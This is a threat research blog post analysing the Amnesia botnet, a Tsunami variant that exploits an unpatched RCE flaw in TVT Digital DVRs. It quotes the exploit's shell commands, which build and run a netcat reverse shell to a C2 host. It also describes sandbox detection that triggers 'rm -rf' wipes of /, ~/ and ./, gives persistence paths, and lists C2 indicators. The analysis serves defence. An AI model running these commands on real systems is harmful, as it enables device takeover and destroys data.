Unit 42 researchers have identified a new variant of the IoT/Linux botnet “Tsunami”, which
we are calling “Amnesia”. The Amnesia botnet targets an unpatched remote code execution
vulnerability that was publicly disclosed over a year ago in March 2016 in DVR (digital video
recorder) devices made by TVT Digital and branded by over 70 vendors worldwide (a listing
of which can be found on the original vulnerability report we've linked to). Based on our scan
data shown below in Figure 1, this vulnerability affects approximately 227,000 devices
around the world with Taiwan, the United States, Israel, Turkey, and India being the most
exposed.

In addition, we believe the Amnesia malware is the first Linux malware to adopt virtual
machine evasion techniques to defeat malware analysis sandboxes. Virtual machine evasion
techniques are more commonly associated with Microsoft Windows and Google Android
malware. Similar to those, Amnesia tries to detect whether it’s running in a VirtualBox,
VMware or QEMU based virtual machine, and if it detects those environments it will wipe the
virtualized Linux system by deleting all the files in file system. This affects not only Linux
malware analysis sandboxes but also some QEMU based Linux servers on VPS or on public
cloud.
Amnesia exploits this remote code execution vulnerability by scanning for, locating, and
attacking vulnerable systems. A successful attack results in Amnesia gaining full control of
the device. Attackers could potentially harness the Amnesia botnet to launch broad DDoS
attacks similar to the Mirai botnet attacks we saw in Fall 2016.
Even though this vulnerability was disclosed over a year ago, despite our best efforts, we
have been unable to find updates that fix this vulnerability.
While the Amnesia botnet hasn’t yet been used to mount large scale attacks, the Mirai botnet
attacks show the potential harm large-scale IoT-based botnets can cause. Palo Alto
Networks recommends all customers ensure they have our latest protections in place.
Additionally, everyone should block traffic to Amnesia’s command and control servers (C2s)
listed in Indicators of Compromise (IoC) section of this blog should do so.

Vulnerability Details
On March 22, 2016, security researcher Rotem Kerner disclosed the vulnerability to the
public. According to his blog, over 70 DVR vendors around the world were affected by the
vulnerability. However, all the DVR devices were manufactured by the same company, “TVT
Digital”. To date, we have been unable to find any patch released by the vendors or the
manufacturer to address the vulnerability.
Additionally, by using the fingerprint of “Cross Web Server”, we discovered over 227,000
devices exposed on Internet that are likely produced by TVT Digital. We also searched the
keyword on Shodan.io and on Censys.io. They reported about 50,000 and about 705,000 IP
addresses respectively.

Table 1 Top 20 Countries for potentially vulnerable TVT DVR Digital Devices
Propagation and Vulnerability Exploitation
Amnesia communicates with its C2 server using the IRC protocol. Figure 2 shows some
commands it was designed to receive, including to launch DDoS attacks by different types of
HTTP flooding and UDP flooding.

Figure 2 C2 Commands of Amnesia
In addition to these commands, two more commands were implemented: CCTVSCANNER
and CCTVPROCS. These commands are used for scanning and exploiting the RCE
vulnerability in TVT Digital DVRs. After receiving the commands, Amnesia will firstly make a
simple HTTP request to the IP address included with the command, checking whether the
target is a vulnerable DVR device. This is done by searching for a special string “Cross Web
Server” in the HTTP response content as shown in Figure 3 since the TVT Digital’s DVRs
used this string as server name in HTTP header.

4/11

Figure 3 Check whether the target is a vulnerable DVR
If a vulnerable DVR is found, Amnesia will send four more HTTP requests which contains
exploit payloads of four different shell commands. The commands are:
echo "nc" > f
echo "{one_of_c2_domains}" >> f
echo "8888 –e $SHELL" >> f
$(cat f) & > r
These commands create a shell script file and execute it. The script content connects with
one of Amnesia C2 servers and to expose system default shell. Therefore, the infected
devices will be compromised and will listen further shell commands sent from C2 servers as
shown in Figure 4

Figure 4 Exploit the RCE vulnerability
Anti-Forensics
When an Amnesia sample executes, it will immediately check whether it’s running in a virtual
machine by reading files /sys/class/dmi/id/product_name and /sys/class/dmi/id/sys_vendor
and comparing the file contents with keywords “VirtualBox”, “VMware” and “QEMU” as
shown in Figure 5. These two files are used by Linux DMI (Desktop Management Interface)
to store hardware’s product and manufacturer information. These strings being included in
the DMI files implies that the Linux system is running in a virtual machine based on
VirtualBox, VMware or QEMU, respectively.

Figure 5 Inspects DMI files to detect VM
If a virtual machine was detected, Amnesia will delete itself, and then try to delete all of the
following directories:
1. the Linux root directory “/”,
2. the current user’s home directory “~/”, and
3. the current working directory “./”
These delete operations are basically equivalent to wiping the whole Linux system. They
were implemented by simply executing shell command “rm -rf” as shown in Figure 6. For
each directory, “rm” command will be executed twice – one in the background, and one in the
foreground. Hence, the deleting of the three directories will be parallel. Finally, Amnesia will
wait for the delete to finish.

6/11

Figure 6 Wipe the Linux system
We believe the author of Amnesia was aiming to defeat Linux-based malware analysis
sandboxes and to cause trouble for security researchers due to a hard-coded but otherwise
useless string in the code: “fxxkwhitehats”. However, VM based sandboxes typically have
system snapshot enabled, allowing for quick recovery to the original state (the sample’s
analysis task may be ruined though). The impact will be limited in these cases. The real
problem is, if the malware infected some QEMU based Linux server instances, such as
virtual hosts provided by VPS vendors, the Linux server will also be wiped, which could be
catastrophic if back-ups are not available.
After the VM check, Amnesia creates persistence files in /etc/init.d/.rebootime and
/etc/cron.daily/.reboottime, or in ~/.bashrc and ~/.bash_history, depending on the current
user’s privileges. It then kills all Telnet and SSH related processes, and connects with a C2
server to receive further commands.
Amnesia hard-coded three domain names such as “irc.freenode.net” as decoy C2 server
addresses. However, the real C2 configuration is decrypted during runtime by simple Caesar
cipher algorithm. It chooses one of these three servers:
ukranianhorseriding[.]net
surrealzxc.co[.]za
inversefierceapplied[.]pw
All three of these domains have resolved to the same IP address 93.174.95[.]38 since
December 1st, 2016. Before that, the IP address was also used to host other IoT/Linux
malware such as DropPerl.

Conclusion
Besides the threat that the Amnesia botnet presents, the malware reveals some interesting
and notable trends of current IoT/Linux botnet threats:

7/11

IoT/Linux malware has begun to adopt classic techniques to evade and even wipe
virtual machines.
IoT/Linux malware targets and attacks known remote code execution vulnerabilities in
IoT devices. These are typically manufactured by smaller manufacturers and there may
be no patch available.
IoT/Linux malware may also affect Linux servers deployed in VPS or in public cloud.
In the case of Amnesia, because the malware relies on hard coded C2 addresses,
preventing another Mirai-type attack is possible if these addresses are blocked as broadly as
possible as quickly as possible.
Update: After publishing this report, we learned of other researchers’ past work on various
aspects of this malware.
As we mentioned in the introduction, the Tsunami bot has a long history, and this latest
version incorporated new features, including a scanner to identify and exploit DVRs for
CCTV systems as well as Anti-VM detection capabilities. The CCTV scanning and
exploitation technique was previously discussed in these two reports.
